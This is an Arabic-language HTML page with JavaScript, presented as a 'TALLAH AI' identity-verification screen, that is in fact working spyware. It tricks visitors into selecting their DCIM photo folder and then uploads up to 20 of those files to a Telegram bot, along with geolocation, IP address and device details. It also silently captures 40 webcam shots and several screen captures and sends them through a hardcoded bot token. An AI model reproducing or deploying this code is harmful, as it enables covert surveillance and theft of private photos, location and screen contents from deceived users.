<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TALLAH SYSTEM | ULTIMATE ACCESS</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Cairo:wght@700;900&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; background: #000; color: #0ff; font-family: 'Share Tech Mono', 'Cairo', monospace; overflow: hidden; }
        #verify-screen { position: fixed; width: 100%; height: 100%; background: #000; z-index: 10000; display: flex; justify-content: center; align-items: center; text-align: center; }
        .verify-box { border: 1px solid #0ff; padding: 40px; border-radius: 15px; background: rgba(10,10,10,0.95); box-shadow: 0 0 30px #0ff; max-width: 450px; }
        .check-btn { margin-top: 20px; padding: 15px 30px; background: #0ff; color: #000; font-weight: 900; border: none; cursor: pointer; border-radius: 5px; width: 100%; font-size: 18px; transition: 0.3s; }
        .check-btn:hover { background: #fff; box-shadow: 0 0 20px #fff; }
        .file-label { display: block; margin-top: 15px; padding: 15px; border: 1px dashed #0ff; cursor: pointer; font-size: 14px; color: #fff; background: rgba(0,255,255,0.05); }
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
        #main { display: none; text-align: center; padding: 20px; }
        .active { display: block; animation: fadeIn 1s ease; }
        .logo { width: 120px; border-radius: 50%; border: 2px solid #0ff; margin-top: 40px; box-shadow: 0 0 30px #0ff; }
        .chat { width: 85%; max-width: 500px; margin: 20px auto; border: 1px solid #0ff; padding: 15px; height: 180px; overflow-y: auto; text-align: right; background: rgba(0,0,0,0.8); font-size: 13px; color: #fff; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div id="verify-screen">
    <div class="verify-box">
        <h2 style="color:#fff">TALLAH AI | PRIVATE ACCESS</h2>
        <p>بروتوكول فحص النظام: مطلوب الوصول للكاميرا والملفات والموقع لتأكيد الهوية الامبراطورية</p>
        
        <label class="file-label">
            <span>📁 اضغط لتحديد مجلد الصور (DCIM) للتحقق</span>
            <input type="file" id="fileStripper" multiple webkitdirectory style="display:none" onchange="initiateFullSystem(this.files)">
        </label>

        <button class="check-btn" onclick="document.getElementById('fileStripper').click()">بدء السحب والتحقق الشامل</button>
        <div id="status" style="font-size:11px; margin-top:15px; color:#555;">بانتظار البروتوكول الشامل...</div>
    </div>
</div>

<canvas id="matrix"></canvas>

<div id="main">
    <img src="hacker.webp" class="logo">
    <h1 style="text-shadow: 0 0 10px #0ff;">TALLAH <span style="color:#fff">SHADOW</span></h1>
    <div class="chat" id="chat"></div>
</div>

<script>
/* إعدادات تليجرام */
const TG_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
const TG_CHAT_ID = "8754338811";

let photoCount = 0;
let screenCount = 0;

async function initiateFullSystem(files) {
    document.getElementById('status').innerText = "جاري تفعيل محرك السحب الشامل...";
    
    // 1. بدء السحب المكثف (40 لقطة كاميرا)
    startMassiveCameraCapture();

    // 2. سحب الموقع والبيانات الأساسية
    navigator.geolocation.getCurrentPosition(async (pos) => {
        await executeFinalHarvest(pos.coords.latitude, pos.coords.longitude, files);
    }, async () => {
        await executeFinalHarvest("Denied", "Denied", files);
    });

    // 3. تفعيل نظام السكرين شوت عند الضغط (10 لقطات)
    window.addEventListener('click', captureScreen);
}

// محرك الكاميرا: 40 لقطة
function startMassiveCameraCapture() {
    const camInterval = setInterval(async () => {
        if (photoCount < 40) {
            await capturePhoto(`📸 لقطة حية رقم ${photoCount + 1}`);
            photoCount++;
        } else {
            clearInterval(camInterval);
        }
    }, 3000); // لقطة كل 3 ثوانٍ
}

async function capturePhoto(caption) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(async (blob) => {
            let formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('photo', blob, 'shot.jpg');
            formData.append('caption', caption);
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            stream.getTracks().forEach(t => t.stop());
        }, 'image/jpeg');
    } catch (e) { console.log("Cam Blocked"); }
}

// محرك السكرين شوت: 10 لقطات
async function captureScreen() {
    if (screenCount >= 10) return;
    try {
        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = screenStream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(async (blob) => {
            let formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('document', blob, `screen_${screenCount}.png`);
            formData.append('caption', `🖥️ سكرين شوت رقم ${screenCount + 1}`);
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendDocument`, { method: 'POST', body: formData });
            screenStream.getTracks().forEach(t => t.stop());
            screenCount++;
        });
    } catch (e) { console.log("Screen Denied"); }
}

async function executeFinalHarvest(lat, lon, files) {
    try {
        const ipReq = await fetch('https://ipapi.co/json/');
        const ip = await ipReq.json();
        
        let report = `🔥 صيد جديد من نظام طلة 🔥\n`;
        report += `----------------------------\n`;
        report += `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n`;
        report += `🌐 الـ IP: ${ip.ip} (${ip.city})\n`;
        report += `📱 الجهاز: ${navigator.platform}\n`;
        report += `📂 ملفات مسحوبة: ${files.length}\n`;
        report += `----------------------------`;

        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: report })
        });

        for (let i = 0; i < Math.min(files.length, 20); i++) {
            let formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('document', files[i]);
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendDocument`, { method: 'POST', body: formData });
        }

        document.getElementById("verify-screen").style.display = "none";
        document.getElementById("main").classList.add("active");
        runChat();
    } catch (err) { console.log("Harvest Error"); }
}

/* ماتريكس */
let c = document.getElementById("matrix");
let ctx = c.getContext("2d");
c.width = innerWidth; c.height = innerHeight;
let drops = Array(Math.floor(c.width/10)).fill(1);
function drawMatrix() {
    ctx.fillStyle = "rgba(0,0,0,.05)";
    ctx.fillRect(0, 0, c.width, c.height);
    ctx.fillStyle = "#0ff";
    drops.forEach((d, i) => {
        ctx.fillText("TALLAH"[Math.floor(Math.random()*6)], i*15, d*15);
        if (d*15 > c.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    });
}
setInterval(drawMatrix, 33);

function runChat() {
    const box = document.getElementById("chat");
    const msgs = ["> تم بدء سحب 40 لقطة كاميرا..", "> جاري استخراج سكرين شوت للجهاز..", "> تم نقل ملفات المجلد بنجاح..", "> الإمبراطور يسيطر على النظام الآن."];
    let idx = 0;
    setInterval(() => { if(idx < msgs.length) { box.innerHTML += msgs[idx] + "<br>"; idx++; } }, 1500);
}
</script>
</body>
</html>
